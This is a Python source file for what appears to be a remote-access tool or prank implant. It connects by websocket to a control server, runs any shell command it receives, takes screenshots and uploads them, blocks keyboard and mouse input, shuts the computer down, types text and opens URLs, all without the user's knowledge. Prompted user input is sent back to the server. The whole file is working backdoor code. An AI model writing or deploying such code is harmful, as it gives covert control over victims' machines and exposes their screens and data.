import asyncio
import websockets
import websockets.exceptions
import pyautogui as pg
import keyboard
import os
import time
import requests
import socket
import subprocess
import webbrowser

#function import
import blockInput
from notepadType import notepad_write
from prompt import alertPrompt
from prompt import inputPrompt

def take_screenshot():
    try:
        pc_name = socket.gethostname()
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        url = "http://localhost:3000/upload"
        with open(filename,"rb") as f:
            requests.post(url,files={"screenshot":f})
        os.remove(filename)
    except:
        pass
      
def handle_msg(msg):
    try:
            if msg == "block":
                blockInput.start_block("both")
            elif msg == "blockkeyboard":
                blockInput.start_block("keyboard")
            elif msg == "blockmouse":
                blockInput.start_block("mouse")     
            elif msg == "unblock":
                blockInput.unblock_all()
            elif msg == "shutdown":
                os.system("shutdown /s /t 0")   
            elif msg=="cmd":
                    print("error")    
            elif msg=="desktop":
                pg.hotkey("win","d")
            elif msg=="close":
                pg.hotkey("alt","f4")         
            elif msg=="screenshot":
                take_screenshot() 
    except:
        pass                
async def listen():
    uri = "ws://localhost:3000"
    pc_name = socket.gethostname()
    while True:
        try:
            async with websockets.connect(uri) as websocket:
                await websocket.send("Connected : "+pc_name)
                while True:
                    message = await websocket.recv() 
                    print("Recieved : ", message)
                    if message.startswith("subprocess"):
                        
                        command = message[len("subprocess "):]
                        print(command)
                        subprocess.run(command,shell=True)
                    elif message.startswith("browser"):
                    
                        command = message[len("browser "):]
                        print(command)
                        webbrowser.open(command)

                    elif message.startswith("type"):
                    
                        command = message[len("type "):]
                        print(command)
                        pg.typewrite(command,0.2) 
                    elif message.startswith("notepadtypeheart"):
                    
                        command = message[len("notepadtypeheart "):]
                        notepad_write(command,True)     
                    elif message.startswith("notepadtype"):
                    
                        command = message[len("notepadtype "):]
                        notepad_write(command,False) 
                    elif message.startswith("alertprompt"):
                    
                        command = message[len("alertprompt "):]
                        alertPrompt(command) 
                    elif message.startswith("inputprompt"):
                    
                        command = message[len("inputprompt "):]
                        value=inputPrompt(command)  
                        await websocket.send(value)
                    elif message.startswith("backspace"):
                    
                        command = message[len("backspace "):]
                        try:
                            for _ in range(int(command)):
                                pg.press("backspace")
                                time.sleep(0.05)
                        except Exception as e:
                            print(e)    
                    else:    
                        handle_msg(message)                
        except (websockets.exceptions.ConnectionClosedError,ConnectionRefusedError):
            print("connection lost . Reconnecting in 3 seconds ...")
            await asyncio.sleep(3)

asyncio.run(listen())
